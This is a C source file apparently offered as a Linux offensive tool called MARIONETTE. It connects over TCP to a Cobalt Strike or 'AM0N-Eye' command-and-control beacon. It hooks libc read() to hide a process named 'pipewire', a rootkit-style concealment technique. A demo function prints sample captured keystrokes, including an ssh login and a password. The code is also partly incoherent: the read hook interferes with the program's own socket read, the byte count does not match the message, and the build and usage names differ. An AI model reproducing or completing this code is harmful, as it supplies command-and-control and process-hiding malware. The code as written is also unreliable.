/* 
Here's an example C code snippet for connecting to a AM0N-Eye and Cobalt Strike beacon using a TCP socket on Linux.
In this code, replace the call to write with the code that sends the command to the AM0N-Eye and Cobalt Strike beacon over a TCP socket, and replace the call to read with the code that receives the response from the beacon over the same socket. 
Note that you will need to provide the IP address and port number of the AM0N-Eye and Cobalt Strike beacon as command-line arguments when you run the program.
Replace ip_address and port with the IP address and port number of the AM0N-Eye and Cobalt Strike beacon you want to connect to.

Hiding Target Process
Since function already calls the original read() function  have all the information we need to hide the process in the buf pointer.


Build: gcc MARIONETTE.c -o MARIONETTE
Use : ./command_control ip_address port

 -------------------------------
| Author : S3N4T0R               |
| Name : MARIONETTE              |
| Date : April 30sun 2023        |
| OS   : Linux                   |  
 --------------------------------
Build: gcc MARIONETTE.c -o MARIONETTE
Use : ./command_control ip_address port
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <dlfcn.h>
#define PROC_NAME "pipewire"

int crossc2_entry(int argc, char **argv) {
    printf("into AM0N-Eye c2_entry():\n");
    printf("\t-> argc = %d\n", argc);
    int i = 0;
    for (i = 0; i < argc; ++i) {
        printf("\t->%s\n", argv[i]);
    }

    printf("test demo\n");
    printf("User keyboard input: ssh root@10.14.11.32\n");
    printf("test_username\n");
    printf("pwd_123467aaa\n");
    printf("ifconfig\n");
    printf("[Ctrl-D]\n");

    return 1;
}

ssize_t read(int fd, void *buf, size_t count) {
    ssize_t (*orig_read)(int fd, void *buf, size_t count);
    ssize_t result;

    orig_read = dlsym(RTLD_NEXT, "read");

    result = orig_read(fd, buf, count);
    
    if(strstr(buf, PROC_NAME)) {
        return 0;
    }

    return result;
}

int main(int argc, char *argv[]) {
    int sockfd, portno;
    struct sockaddr_in serv_addr;
    char buffer[256];
    int n;

    if (argc < 3) {
        printf("Usage: %s <ip_address> <port>\n", argv[0]);
        exit(EXIT_FAILURE);
    }
    
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }
    
    bzero((char*)&serv_addr, sizeof(serv_addr));
    portno = atoi(argv[2]);
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(portno);
    
    if (inet_pton(AF_INET, argv[1], &serv_addr.sin_addr) <= 0) {
        perror("inet_pton");
        exit(EXIT_FAILURE);
    }
    
    if (connect(sockfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) {
        perror("connect");
        exit(EXIT_FAILURE);
    }
    
    n = write(sockfd, "Hello, AM0N-Eye and Cobalt Strike beacon!", 28);
    if (n < 0) {
        perror("write");
        exit(EXIT_FAILURE);
    }
    
    bzero(buffer, sizeof(buffer));
    n = read(sockfd, buffer, sizeof(buffer));
    if (n < 0) {
        perror("read");
        exit(EXIT_FAILURE);
    }
    
    printf("Received response: %s\n", buffer);
    
    close(sockfd);
    return 0;
}
